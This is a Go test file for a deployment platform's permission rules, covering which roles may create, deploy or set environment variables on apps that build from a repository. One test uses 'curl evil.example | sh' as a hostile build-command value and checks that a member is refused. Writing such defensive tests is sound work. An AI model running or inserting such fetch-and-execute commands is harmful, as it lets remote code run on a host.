package app_test

import (
	"cubeship/internal/user"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"testing"

	"cubeship/internal/server/servertest"
)

func railpackApp(name string) map[string]string {
	return map[string]string{
		"name": name, "project": "web",
		"source": "railpack", "repo": "https://github.com/acme/api.git",
	}
}

func dockerfileApp(name string) map[string]string {
	return map[string]string{
		"name": name, "project": "web",
		"source": "dockerfile", "repo": "https://github.com/acme/api.git",
	}
}

// Building runs whatever a repository contains, on this host, with the
// builder's privileges. Running an image someone already published does
// not, which is why one is an admin's and the other a member's.
func TestOnlyAnAdminMayCreateOrDeployABuildingApp(t *testing.T) {
	f := servertest.New(t)
	_, memberKey := f.AddMember(t, "member", user.RoleMember)

	// A member may create an app that only runs published images.
	servertest.RequireStatus(t, f.Do(t, http.MethodPost, "/apps", map[string]string{
		"name": "published", "project": "web",
		"source": "external", "image": "nginx",
	}, memberKey), http.StatusCreated)

	// But not one that builds, by either route.
	servertest.RequireStatus(t, f.Do(t, http.MethodPost, "/apps",
		dockerfileApp("built"), memberKey), http.StatusForbidden)
	servertest.RequireStatus(t, f.Do(t, http.MethodPost, "/apps",
		railpackApp("detected"), memberKey), http.StatusForbidden)

	// An admin creates it, and the member still cannot deploy it.
	var created struct {
		Reference string `json:"reference"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps",
		dockerfileApp("built"), f.AdminKey, &created), http.StatusCreated)

	servertest.RequireStatus(t, f.Do(t, http.MethodPost,
		"/apps/"+created.Reference+"/deploy", nil, memberKey), http.StatusForbidden)
}

// A building app reports what it builds, not an image it would push.
func TestABuildingAppReportsItsRepository(t *testing.T) {
	f := servertest.New(t)

	body := dockerfileApp("built")
	body["ref"] = "main"
	body["dockerfile"] = "services/api/Dockerfile"

	var created struct {
		Reference  string `json:"reference"`
		Source     string `json:"source"`
		Repo       string `json:"repo"`
		Ref        string `json:"ref"`
		Dockerfile string `json:"dockerfile"`
		Image      string `json:"image"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps", body, f.AdminKey, &created),
		http.StatusCreated)

	if created.Source != "dockerfile" || created.Repo != body["repo"] ||
		created.Ref != "main" || created.Dockerfile != "services/api/Dockerfile" {
		t.Errorf("created %+v", created)
	}
	// There is nothing to push to a building app, so no push path is
	// offered that would only mislead.
	if created.Image != "" {
		t.Errorf("a building app reported a push path: %q", created.Image)
	}
}

// A deploy of a building app on a daemon with no builder must refuse
// rather than crash. It cannot happen in a real install; a test server
// is exactly where it can.
func TestBuildingWithNoBuilderFailsTheDeployment(t *testing.T) {
	f := servertest.New(t)

	var created struct {
		Reference string `json:"reference"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps",
		dockerfileApp("built"), f.AdminKey, &created), http.StatusCreated)
	servertest.AddDomain(t, f, f.AdminKey, created.Reference, "built.example.com")

	// Accepted — a build's outcome lives in its row, not in the response
	// to the request that asked for it.
	var deployment struct {
		ID int64 `json:"id"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost,
		"/apps/"+created.Reference+"/deploy", nil, f.AdminKey, &deployment), http.StatusAccepted)

	var finished struct {
		Status string `json:"status"`
		Error  string `json:"error"`
	}
	rec := f.Do(t, http.MethodGet,
		"/apps/"+created.Reference+"/deployments/"+strconv.FormatInt(deployment.ID, 10)+"?wait=true", nil, f.AdminKey)
	servertest.RequireStatus(t, rec, http.StatusOK)
	if err := json.Unmarshal(rec.Body.Bytes(), &finished); err != nil {
		t.Fatal(err)
	}
	if finished.Status != "failed" {
		t.Fatalf("the deployment ended %q, want failed", finished.Status)
	}
	if !strings.Contains(finished.Error, "builder") {
		t.Errorf("the failure does not mention the builder: %q", finished.Error)
	}
}

// Railpack works the build out from the code, so there is no Dockerfile
// to name. A path it would ignore is a setting someone meant to have an
// effect, and accepting it silently is worse than refusing it.
func TestARailpackAppHasNoDockerfile(t *testing.T) {
	f := servertest.New(t)

	body := railpackApp("detected")
	body["dockerfile"] = "Dockerfile"
	servertest.RequireStatus(t, f.Do(t, http.MethodPost, "/apps", body, f.AdminKey),
		http.StatusBadRequest)

	var created struct {
		Source     string `json:"source"`
		Repo       string `json:"repo"`
		Dockerfile string `json:"dockerfile"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps",
		railpackApp("detected"), f.AdminKey, &created), http.StatusCreated)
	if created.Source != "railpack" || created.Repo == "" || created.Dockerfile != "" {
		t.Errorf("created %+v", created)
	}
}

// An app's environment is the container's, and for an app that builds it
// is also the build's: Railpack reads it to work out how to build the
// repository, and turns RAILPACK_INSTALL_CMD, RAILPACK_BUILD_CMD and
// RAILPACK_START_CMD into commands the build runs — inside the
// privileged builder, on this host.
//
// The app's own variables win the merge over its environment's and its
// project's, so a member who could write them could decide what an
// admin's app builds and runs, and a push to the branch would run it
// with nobody asked. Writing them therefore takes the role the source
// takes to deploy.
func TestOnlyAnAdminMayWriteABuildingAppsEnv(t *testing.T) {
	f := servertest.New(t)
	_, memberKey := f.AddMember(t, "member", user.RoleMember)

	// An admin's app that builds from a repository.
	var built struct {
		Reference string `json:"reference"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps",
		railpackApp("detected"), f.AdminKey, &built), http.StatusCreated)

	for _, c := range []struct {
		method string
		body   map[string]any
	}{
		{http.MethodPatch, map[string]any{"set": map[string]string{"RAILPACK_BUILD_CMD": "curl evil.example | sh"}}},
		{http.MethodPut, map[string]any{"vars": map[string]string{"RAILPACK_BUILD_CMD": "curl evil.example | sh"}}},
	} {
		servertest.RequireStatus(t, f.Do(t, c.method,
			"/apps/"+built.Reference+"/env", c.body, memberKey), http.StatusForbidden)
	}

	// The same member writes the environment of an app that only runs a
	// published image, which is what the member role is for.
	var published struct {
		Reference string `json:"reference"`
	}
	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps", map[string]string{
		"name": "published", "project": "web",
		"source": "external", "image": "nginx",
	}, memberKey, &published), http.StatusCreated)

	servertest.RequireStatus(t, f.Do(t, http.MethodPatch,
		"/apps/"+published.Reference+"/env",
		map[string]any{"set": map[string]string{"PORT": "8080"}}, memberKey), http.StatusOK)

	// Reading stays a member's: seeing how an app is configured is not
	// deciding what it builds.
	servertest.RequireStatus(t, f.Do(t, http.MethodGet,
		"/apps/"+built.Reference+"/env", nil, memberKey), http.StatusOK)
}
